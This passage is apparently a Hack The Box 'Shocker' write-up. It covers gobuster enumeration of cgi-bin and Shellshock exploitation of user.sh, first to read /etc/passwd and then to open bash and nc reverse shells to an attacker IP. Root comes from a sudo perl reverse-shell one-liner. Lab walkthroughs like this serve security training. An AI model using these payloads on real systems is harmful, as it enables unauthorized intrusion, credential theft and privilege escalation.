/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 400) [Size: 303]
/../../../../../../../../../../etc/passwd (Status: 400) [Size: 303]                                
/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini (Status: 400) [Size: 303]                      
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 400) [Size: 303]             
/?mod=<script>alert(document.cookie)</script>&op=browse (Status: 403) [Size: 294]                  
/?sql_debug=1         (Status: 403) [Size: 294]                                                    
///                   (Status: 403) [Size: 296]                                                    
/file/../../../../../../../../etc/ (Status: 400) [Size: 303]                                       
/?PageServices        (Status: 403) [Size: 294]                                                    
/?wp-cs-dump          (Status: 403) [Size: 294]                                                    
/./../../../../../../../../../etc/passw* (Status: 400) [Size: 303]                                 
/./../../../../../../../../../etc/* (Status: 400) [Size: 303]                                      
/.htpasswd            (Status: 403) [Size: 303]                                                    
/.htaccess            (Status: 403) [Size: 303]                                                    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// (Status: 403) [Size: 501]
Progress: 2961 / 3389 (87.37%)                                                                                                                                                                           /?pattern=/etc/*&sort=name (Status: 403) [Size: 294]                                                                                                                                                                                      
Progress: 3144 / 3389 (92.77%)                                                                                                                                                                           /?D=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?N=D                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?S=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/?M=A                 (Status: 403) [Size: 294]                                                                                                                                                                                           
/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                             
/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                              
/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe (Status: 400) [Size: 303]                                                                                                                                             
/?\"><script>alert('Vulnerable');</script> (Status: 403) [Size: 294]                                                                                                                                                                      
Progress: 3304 / 3389 (97.49%)                                                                                                                                                                                                                                                                                                                                                                                                                     
===============================================================
2021/06/14 09:50:46 Finished
===============================================================
```

No luck. I ran a scan again against the directory with `raft-small-words.txt`, specifying the `.cgi` extension:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w raft-small-words.txt -x cgi
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2021/06/14 09:52:38 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 299]
/.html.cgi            (Status: 403) [Size: 303]
/.htm                 (Status: 403) [Size: 298]
/.htm.cgi             (Status: 403) [Size: 302]
/.                    (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 303]
/.htaccess.cgi        (Status: 403) [Size: 307]
/.htc                 (Status: 403) [Size: 298]
/.htc.cgi             (Status: 403) [Size: 302]
/.html_var_DE         (Status: 403) [Size: 306]
/.html_var_DE.cgi     (Status: 403) [Size: 310]
/.htpasswd.cgi        (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 303]
/.html.               (Status: 403) [Size: 300]
/.html..cgi           (Status: 403) [Size: 304]
/.html.html           (Status: 403) [Size: 304]
/.html.html.cgi       (Status: 403) [Size: 308]
/.htpasswds           (Status: 403) [Size: 304]
/.htpasswds.cgi       (Status: 403) [Size: 308]
/.htm.                (Status: 403) [Size: 299]
/.htm..cgi            (Status: 403) [Size: 303]
/.htmll               (Status: 403) [Size: 300]
/.htmll.cgi           (Status: 403) [Size: 304]
/.html.old            (Status: 403) [Size: 303]
/.html.old.cgi        (Status: 403) [Size: 307]
/.ht                  (Status: 403) [Size: 297]
/.html.bak            (Status: 403) [Size: 303]
/.ht.cgi              (Status: 403) [Size: 301]
/.html.bak.cgi        (Status: 403) [Size: 307]
/.htm.htm             (Status: 403) [Size: 302]
/.htm.htm.cgi         (Status: 403) [Size: 306]
/.hta                 (Status: 403) [Size: 298]
/.htgroup             (Status: 403) [Size: 302]
/.html1               (Status: 403) [Size: 300]
/.htgroup.cgi         (Status: 403) [Size: 306]
/.hta.cgi             (Status: 403) [Size: 302]
/.html1.cgi           (Status: 403) [Size: 304]
/.html.LCK            (Status: 403) [Size: 303]
/.html.printable      (Status: 403) [Size: 309]
/.html.LCK.cgi        (Status: 403) [Size: 307]
/.html.printable.cgi  (Status: 403) [Size: 313]
/.htm.LCK             (Status: 403) [Size: 302]
/.htm.LCK.cgi         (Status: 403) [Size: 306]
/.htmls.cgi           (Status: 403) [Size: 304]
/.htmls               (Status: 403) [Size: 300]
/.htx                 (Status: 403) [Size: 298]
/.html.php            (Status: 403) [Size: 303]
/.htaccess.bak        (Status: 403) [Size: 307]
/.htaccess.bak.cgi    (Status: 403) [Size: 311]
/.htx.cgi             (Status: 403) [Size: 302]
/.html.php.cgi        (Status: 403) [Size: 307]
/.htlm.cgi            (Status: 403) [Size: 303]
/.htm2                (Status: 403) [Size: 299]
/.html-               (Status: 403) [Size: 300]
/.htuser              (Status: 403) [Size: 301]
/.htlm                (Status: 403) [Size: 299]
/.htm2.cgi            (Status: 403) [Size: 303]
/.html-.cgi           (Status: 403) [Size: 304]
/.htuser.cgi          (Status: 403) [Size: 305]
                                               
===============================================================
2021/06/14 09:56:51 Finished
===============================================================
```

Nothing again! What about a shells list?

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w CommonBackdoors-PL.fuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                CommonBackdoors-PL.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 10:05:26 Starting gobuster in directory enumeration mode
===============================================================

===============================================================
2021/06/14 10:05:27 Finished
===============================================================
```

I tried searching for alternative target files other people had found. I read a number of really excellent articles that I'll link at the end, but nothing that helped find the script until this one:

![](/assets/images/blogs/Pasted image 20210614100713.png)

[The article](https://shahjerry33.medium.com/shellshock-high-voltage-a6bd2ce69659) describes an example with a `.sh` file:

![](/assets/images/blogs/Pasted image 20210614101325.png)

So let's fuzz for that file extension:

```bash
──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w raft-small-words.txt -x sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2021/06/14 10:13:48 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 299]
/.html.sh             (Status: 403) [Size: 302]
/.htm                 (Status: 403) [Size: 298]
/user.sh              (Status: 200) [Size: 118]
...[snip]...
```

Gobuster immediately found `user.sh`. While the scan finishes, we can test it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh
--2021-06-14 10:15:38--  http://10.10.10.56/cgi-bin/user.sh
Connecting to 10.10.10.56:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘user.sh’

user.sh                                                [ <=>                                                                                                          ]   1.53K  --.-KB/s    in 0s      

2021-06-14 10:15:39 (131 MB/s) - ‘user.sh’ saved [1568]

┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ cat user.sh 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

It works! We've enumerated the users on the box, and can now attempt to get a shell. We're safe to cancel the rest of the gobuster scan, too (we've really hammered this box).

### Getting a Shell

I tried the command from the OWASP talk first:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 10.10.16.211 9001" http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 05:35:55 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00
```

This didn't work - so I tried my usual bash reverse shell, instead using the User Agent header (as suggested in the [shahjerry post](https://shahjerry33.medium.com/shellshock-high-voltage-a6bd2ce69659)):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.211/9001 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

The command hung, and in my netcat listener... I had a shell!

![](/assets/images/blogs/Pasted image 20210614103350.png)

# Shell as Shelly

We can now grab the user flag:

![](/assets/images/blogs/Pasted image 20210614103814.png)

## Basic Enumeration

We have a lot of groups:

```bash
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The `adm` group stands out, as it usually means we can read `/var/log`.

However, a simpler misconfiguration was present:

```bash
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can run perl with root permissions. So we can setup a perl script to give us a shell.

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) has an example of a perl reverse shell:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

I created a `rev.cgi` file on my local box, according to [a tutorial](https://www.lcn.com/support/articles/how-to-create-a-perl-script/):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ cat rev.cgi 
#!/usr/bin/perl

perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

I served the file and downloaded it to `/tmp`:

```bash
shelly@Shocker:/tmp$ wget 10.10.16.211:8000/rev.cgi
wget 10.10.16.211:8000/rev.cgi
--2021-06-14 05:52:18--  http://10.10.16.211:8000/rev.cgi
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 239 [application/octet-stream]
Saving to: 'rev.cgi'

     0K                                                       100% 19.6K=0.01s

2021-06-14 05:52:18 (19.6 KB/s) - 'rev.cgi' saved [239/239]
```

Then ran it according to [this](https://stackoverflow.com/questions/17748688/running-perl-script-from-command-line):

```bash
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.cgi
sudo /usr/bin/perl rev.cgi
syntax error at rev.cgi line 3, near "perl -e "
Execution of rev.cgi aborted due to compilation errors.
```

It won't compile. I tried it as a `.pl` file:

```bash
shelly@Shocker:/tmp$ mv rev.cgi rev.pl
mv rev.cgi rev.pl
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.pl
sudo /usr/bin/perl rev.pl
syntax error at rev.pl line 3, near "perl -e "
Execution of rev.pl aborted due to compilation errors.
```

Then I realised that the payload I copied wasn't the syntax for a perl file - it was just for an inline perl command in bash. So I didn't even need a file to execute from!

I ran this command instead:

```bash
shelly@Shocker:/tmp$ sudo perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

And got a shell!

![](/assets/images/blogs/Pasted image 20210614105016.png)

That's the box!

![](/assets/images/blogs/Pasted image 20210614105225.png)

# Key Lessons
 
- `gobuster` does not automatically check for directories! This isn't an issue on most webservers, as often `/cgi-bin` will redirect to `/cgi-bin/`, but if not you must use the `-f` flag or another tool such as `dirsearch`
- Shellshockable file extensions include `.cgi`, `.sh`, and `.txt`